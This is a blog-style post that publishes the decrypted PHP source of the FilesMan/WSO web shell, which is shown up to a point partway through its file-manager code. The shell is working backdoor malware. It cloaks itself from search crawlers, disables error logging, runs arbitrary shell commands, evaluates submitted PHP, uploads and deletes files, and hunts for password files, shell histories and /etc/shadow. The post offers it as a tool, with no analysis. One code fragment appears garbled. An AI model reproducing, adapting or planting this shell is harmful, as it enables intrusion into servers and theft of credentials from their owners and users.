---
id: 130
title: FilesMan Shell (decrypted)
author: admin
layout: post
guid: http://hackingscripts.com/?p=130
permalink: /filesman-shell-decrypted/
categories:
  - FilesMan
  - PHP
tags:
  - FilesMan
  - PHP
---
This is the decrypted version of the [encrypted FilesMan shell][1].


### FilesMan Shell Source Code (decrypted)

{% highlight php %}<?php #v2.3		//Version
$auth_pass = ""; 	//75b43eac8d215582f6bcab4532eb854e 
$color = "#00FF66";	//Colour
$default_action = "FilesMan";
$default_charset = "Windows-1251";
if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    foreach($userAgents as $agent)
        if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
            header('HTTP/1.0 404 Not Found');
            exit;
        }
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.3');
if( get_magic_quotes_gpc() ) {
	function WSOstripslashes($array) {
		return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
	}
	$_POST = WSOstripslashes($_POST);
}
function wsoLogin() {
	die("&lt;center&gt;&lt;form method=post&gt;Password: &lt;input type=password name=pass&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/center&gt;");
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	if( empty( $auth_pass ) ||
		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		wsoLogin();
 
if( strtolower( substr(PHP_OS,0,3) ) == "win" )
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if( isset( $_POST['c'] ) )
	@chdir($_POST['c']);
$cwd = @getcwd();
if( $os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if( $cwd[strlen($cwd)-1] != '/' )
	$cwd .= '/';
 
if($os == 'win')
	$aliases = array(
		"List Directory" =&gt; "dir",
    	"Find index.php in current dir" =&gt; "dir /s /w /b index.php",
    	"Find *config*.php in current dir" =&gt; "dir /s /w /b *config*.php",
    	"Show active connections" =&gt; "netstat -an",
    	"Show running services" =&gt; "net start",
    	"User accounts" =&gt; "net user",
    	"Show computers" =&gt; "net view",
		"ARP Table" =&gt; "arp -a",
		"IP Configuration" =&gt; "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" =&gt; "ls -lha",
		"list file attributes on a Linux second extended file system" =&gt; "lsattr -va",
  		"show opened ports" =&gt; "netstat -an | grep -i listen",
		"Find" =&gt; "",
  		"find all suid files" =&gt; "find / -type f -perm -04000 -ls",
  		"find suid files in current dir" =&gt; "find . -type f -perm -04000 -ls",
  		"find all sgid files" =&gt; "find / -type f -perm -02000 -ls",
  		"find sgid files in current dir" =&gt; "find . -type f -perm -02000 -ls",
  		"find config.inc.php files" =&gt; "find / -type f -name config.inc.php",
  		"find config* files" =&gt; "find / -type f -name \"config*\"",
  		"find config* files in current dir" =&gt; "find . -type f -name \"config*\"",
  		"find all writable folders and files" =&gt; "find / -perm -2 -ls",
  		"find all writable folders and files in current dir" =&gt; "find . -perm -2 -ls",
  		"find all service.pwd files" =&gt; "find / -type f -name service.pwd",
  		"find service.pwd files in current dir" =&gt; "find . -type f -name service.pwd",
  		"find all .htpasswd files" =&gt; "find / -type f -name .htpasswd",
  		"find .htpasswd files in current dir" =&gt; "find . -type f -name .htpasswd",
  		"find all .bash_history files" =&gt; "find / -type f -name .bash_history",
  		"find .bash_history files in current dir" =&gt; "find . -type f -name .bash_history",
  		"find all .fetchmailrc files" =&gt; "find / -type f -name .fetchmailrc",
  		"find .fetchmailrc files in current dir" =&gt; "find . -type f -name .fetchmailrc",
		"Locate" =&gt; "",
  		"locate httpd.conf files" =&gt; "locate httpd.conf",
		"locate vhosts.conf files" =&gt; "locate vhosts.conf",
		"locate proftpd.conf files" =&gt; "locate proftpd.conf",
		"locate psybnc.conf files" =&gt; "locate psybnc.conf",
		"locate my.conf files" =&gt; "locate my.conf",
		"locate admin.php files" =&gt;"locate admin.php",
		"locate cfg.php files" =&gt; "locate cfg.php",
		"locate conf.php files" =&gt; "locate conf.php",
		"locate config.dat files" =&gt; "locate config.dat",
		"locate config.php files" =&gt; "locate config.php",
		"locate config.inc files" =&gt; "locate config.inc",
		"locate config.inc.php" =&gt; "locate config.inc.php",
		"locate config.default.php files" =&gt; "locate config.default.php",
		"locate config* files " =&gt; "locate config",
		"locate .conf files"=&gt;"locate '.conf'",
		"locate .pwd files" =&gt; "locate '.pwd'",
		"locate .sql files" =&gt; "locate '.sql'",
		"locate .htpasswd files" =&gt; "locate '.htpasswd'",
		"locate .bash_history files" =&gt; "locate '.bash_history'",
		"locate .mysql_history files" =&gt; "locate '.mysql_history'",
		"locate .fetchmailrc files" =&gt; "locate '.fetchmailrc'",
		"locate backup files" =&gt; "locate backup",
		"locate dump files" =&gt; "locate dump",
		"locate priv files" =&gt; "locate priv"
	);
 
function wsoHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color;
	echo "&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'&gt;&lt;title&gt;" . $_SERVER['HTTP_HOST'] . "- WSO " . VERSION ."&lt;/title&gt; 
&lt;style&gt; 
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: $color !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
pre{font-family:Courier,Monospace;}
&lt;/style&gt; 
&lt;script&gt; 
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':addslashes(htmlspecialchars($_POST['p1']))) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':addslashes(htmlspecialchars(@$_POST['p2']))) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':addslashes(htmlspecialchars(@$_POST['p3']))) ."';
	function set(a,c,p1,p2,p3,charset) {
		if(a != null)document.mf.a.value=a;else document.mf.a.value=a_;
		if(c != null)document.mf.c.value=c;else document.mf.c.value=c_;
		if(p1 != null)document.mf.p1.value=p1;else document.mf.p1.value=p1_;
		if(p2 != null)document.mf.p2.value=p2;else document.mf.p2.value=p2_;
		if(p3 != null)document.mf.p3.value=p3;else document.mf.p3.value=p3_;
		if(charset != null)document.mf.charset.value=charset;else document.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		document.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i&lt;document.mf.elements.length;i++)
			params += '&'+document.mf.elements[i].name+'='+encodeURIComponent(document.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
&lt;/script&gt; 
&lt;head&gt;&lt;body&gt;&lt;div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'&gt; 
&lt;form method=post name=mf style='display:none;'&gt; 
&lt;input type=hidden name=a&gt; 
&lt;input type=hidden name=c&gt; 
&lt;input type=hidden name=p1&gt; 
&lt;input type=hidden name=p2&gt; 
&lt;input type=hidden name=p3&gt; 
&lt;input type=hidden name=charset&gt; 
&lt;/form&gt;";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$millink = 'http://milw0rm.com/search.php?dong=';
	if( strpos('Linux', $kernel) !== false )
		$millink .= urlencode( 'Linux Kernel ' . substr($release,0,6) );
	else
		$millink .= urlencode( $kernel . ' ' . substr($release,0,3) );
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0;$i&lt;$n-1;$i++) {
		$cwd_links .= "&lt;a href='#' onclick='g(\"FilesMan\",\"";

		for($j=0;$j&lt;=$i;$j++)

			$cwd_links .= $path[$j].';/'$cwd_links

		. )'= ""&gt;".$path[$i]."/&lt;/a&gt;";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $item)
		$opt_charsets .= '&lt;option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'&gt;'.$item.'&lt;/option&gt;';
	$m = array('Sec. Info'=&gt;'SecInfo','Files'=&gt;'FilesMan','Console'=&gt;'Console','Sql'=&gt;'Sql','Php'=&gt;'Php','Safe mode'=&gt;'SafeMode','String tools'=&gt;'StringTools','Bruteforce'=&gt;'Bruteforce','Network'=&gt;'Network');
	if(!empty($GLOBALS['auth_pass']))
		$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k =&gt; $v)
		$menu .= '&lt;th width="'.(int)(100/count($m)).'%"&gt;[ &lt;a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')"&gt;'.$k.'&lt;/a&gt; ]&lt;/th&gt;';
	$drives = "";
	if ($GLOBALS['os'] == 'win') {
		foreach( range('c','z') as $drive )
		if (is_dir($drive.':\\'))
			$drives .= '&lt;a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')"&gt;[ '.$drive.' ]&lt;/a&gt; ';
	}
	echo '&lt;table class=info cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td width=1&gt;&lt;span&gt;Uname:&lt;br&gt;User:&lt;br&gt;Php:&lt;br&gt;Hdd:&lt;br&gt;Cwd:'.($GLOBALS['os'] == 'win'?'&lt;br&gt;Drives:':'').'&lt;/span&gt;&lt;/td&gt;'.
		 '&lt;td&gt;&lt;nobr&gt;'.substr(@php_uname(), 0, 120).'  &lt;a href="http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank"&gt;[Google]&lt;/a&gt; &lt;a href="'.$millink.'" target=_blank&gt;[milw0rm]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;'.$uid.' ( '.$user.' ) &lt;span&gt;Group:&lt;/span&gt; '.$gid.' ( '.$group.' )&lt;br&gt;'.@phpversion().' &lt;span&gt;Safe mode:&lt;/span&gt; '.($GLOBALS['safe_mode']?'&lt;font color=red&gt;ON&lt;/font&gt;':'&lt;font color=#00bb00&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;').' &lt;a href=# onclick="g(\'Php\',null,\'\',\'info\')"&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; '.date('Y-m-d H:i:s').'&lt;br&gt;'.wsoViewSize($totalSpace).' &lt;span&gt;Free:&lt;/span&gt; '.wsoViewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)&lt;br&gt;'.$cwd_links.' '.wsoPermsColor($GLOBALS['cwd']).' &lt;a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')"&gt;[ home ]&lt;/a&gt;&lt;br&gt;'.$drives.'&lt;/td&gt;'.
		 '&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange="g(null,null,null,null,null,this.value)"&gt;&lt;optgroup label="Page charset"&gt;'.$opt_charsets.'&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;'.@$_SERVER["SERVER_ADDR"].'&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;'.$_SERVER['REMOTE_ADDR'].'&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'.
		 '&lt;table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;'.$menu.'&lt;/tr&gt;&lt;/table&gt;&lt;div style="margin:5"&gt;';
}
 
function wsoFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?"&lt;font color=green&gt;[ Writeable ]&lt;/font&gt;":"&lt;font color=red&gt;[ Not writable ]&lt;/font&gt;";
    echo "
&lt;/div&gt; 
&lt;table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'&gt; 
	&lt;tr&gt; 
		&lt;td&gt;&lt;form onsubmit='g(null,this.c.value);return false;'&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt; 
		&lt;td&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt; 
	&lt;/tr&gt;&lt;tr&gt; 
		&lt;td&gt;&lt;form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"&gt;&lt;span&gt;Make dir:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=d&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;$is_writable&lt;/td&gt; 
		&lt;td&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"&gt;&lt;span&gt;Make file:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;$is_writable&lt;/td&gt; 
	&lt;/tr&gt;&lt;tr&gt; 
		&lt;td&gt;&lt;form onsubmit=\"g('Console',null,this.c.value);return false;\"&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt; 
		&lt;td&gt;&lt;form method='post' ENCTYPE='multipart/form-data'&gt; 
		&lt;input type=hidden name=a value='FilesMAn'&gt; 
		&lt;input type=hidden name=c value='" . $GLOBALS['cwd'] ."'&gt; 
		&lt;input type=hidden name=p1 value='uploadFile'&gt; 
		&lt;input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'&gt; 
		&lt;span&gt;Upload file:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=file name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;$is_writable&lt;/td&gt; 
	&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;";
}
 
if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }
function wsoEx($in) {
	$out = '';
	if(function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	}elseif(function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	}elseif(function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	}elseif(function_exists('shell_exec')) {
		$out = shell_exec($in);
	}elseif(is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
function wsoViewSize($s) {
	if($s &gt;= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s &gt;= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s &gt;= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}
 
function wsoPerms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function wsoPermsColor($f) {
	if (!@is_readable($f))
		return '&lt;font color=#FF0000&gt;'.wsoPerms(@fileperms($f)).'&lt;/font&gt;';
	elseif (!@is_writable($f))
		return '&lt;font color=white&gt;'.wsoPerms(@fileperms($f)).'&lt;/font&gt;';
	else
		return '&lt;font color=#00BB00&gt;'.wsoPerms(@fileperms($f)).'&lt;/font&gt;';
}
if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh))) {
    		$files[] = $filename;
		}
		return $files;
	}
}
function wsoWhich($p) {
	$path = wsoEx('which '.$p);
	if(!empty($path))
		return $path;
	return false;
}
function actionSecInfo() {
	wsoHeader();
	echo '&lt;h1&gt;Server security information&lt;/h1&gt;&lt;div class=content&gt;';
	function wsoSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '&lt;span&gt;'.$n.': &lt;/span&gt;';
			if(strpos($v, "\n") === false)
				echo $v.'&lt;br&gt;';
			else
				echo '&lt;pre class=ml1&gt;'.$v.'&lt;/pre&gt;';
		}
	}
 
	wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
	wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	wsoSecParam('Open base dir', @ini_get('open_basedir'));
	wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	wsoSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	wsoSecParam('Supported databases', implode(', ', $temp));
	echo '&lt;br&gt;';
 
	if( $GLOBALS['os'] == 'nix' ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes &lt;a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'&gt;[view]&lt;/a&gt;":'no');
		wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes &lt;a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'&gt;[view]&lt;/a&gt;":'no');
		wsoSecParam('OS version', @file_get_contents('/proc/version'));
		wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
		if(!$GLOBALS['safe_mode']) {
			echo '&lt;br&gt;';
			$temp=array();
			foreach ($userful as $item)
				if(wsoWhich($item)){$temp[]=$item;}
			wsoSecParam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(wsoWhich($item)){$temp[]=$item;}
			wsoSecParam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item)
				if(wsoWhich($item)){$temp[]=$item;}
			wsoSecParam('Downloaders', implode(', ',$temp));
			echo '&lt;br/&gt;';
            wsoSecParam('HDD space', wsoEx('df -h'));
			wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
		}
	} else {
		wsoSecParam('OS Version',wsoEx('ver'));
		wsoSecParam('Account Settings',wsoEx('net accounts'));
		wsoSecParam('User Accounts',wsoEx('net user'));
	}
	echo '&lt;/div&gt;';
	wsoFooter();
}
 
function actionPhp() {
	if( isset($_POST['ajax']) ) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'&#92;&#48;")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
	wsoHeader();
	if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {
		echo '&lt;h1&gt;PHP info&lt;/h1&gt;&lt;div class=content&gt;&lt;style&gt;.p {color:#000;}&lt;/style&gt;';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
		$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
		echo str_replace('h1','h2',$tmp).'&lt;/div&gt;&lt;br&gt;';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
		echo '&lt;h1&gt;Execution PHP-code&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'&lt;/textarea&gt;&lt;input type=submit value=Eval style="margin-top:5px"&gt;';
	echo ' &lt;input type=checkbox name=ajax value=1 '.(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'&gt; send using AJAX&lt;/form&gt;&lt;pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1&gt;';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '&lt;/pre&gt;&lt;/div&gt;';
	wsoFooter();
}
 
function actionFilesMan() {
	wsoHeader();
	echo '&lt;h1&gt;File manager&lt;/h1&gt;&lt;div class=content&gt;&lt;script&gt;p1_=p2_=p3_="";&lt;/script&gt;';
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_SESSION['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						copy_paste($_SESSION['c'],$f, $GLOBALS['cwd']);
				} elseif($_SESSION['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(@is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						@rename($_SESSION['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_SESSION['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip-&gt;open('wso_'.date("Ymd_His").'.zip', (int)@eval('return ZIPARCHIVE::CREATE;'))) {
                            chdir($_SESSION['c']);
                            foreach($_SESSION['f'] as $f) {
                                if(@is_file($_SESSION['c'].$f))
                                    $zip-&gt;addFile($_SESSION['c'].$f, $f);
                                elseif(@is_dir($_SESSION['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
                                    foreach ($iterator as $key=&gt;$value) {
                                        $zip-&gt;addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip-&gt;close();
                        }
                    }
				} elseif($_SESSION['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_SESSION['f'] as $f) {
                            if($zip-&gt;open($_SESSION['c'].$f)) {
                                $zip-&gt;extractTo($GLOBALS['cwd']);
                                $zip-&gt;close();
                            }
                        }
                    }
				}
				unset($_SESSION['f']);
				break;
			default:
				if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')||($_POST['p1'] == 'zip')||($_POST['p1'] == 'unzip')) ) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k =&gt; $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['c'] = @$_POST['c'];
				}
				break;
		}
	}
	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';wsoFooter(); return;	}
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "&lt;script&gt; 
	function sa() {
		for(i=0;i&lt;document.files.elements.length;i++)
			if(document.files.elements[i].type == 'checkbox')
				document.files.elements[i].checked = document.files.elements[0].checked;
	}
&lt;/script&gt; 
&lt;table width='100%' class='main' cellspacing='0' cellpadding='2'&gt; 
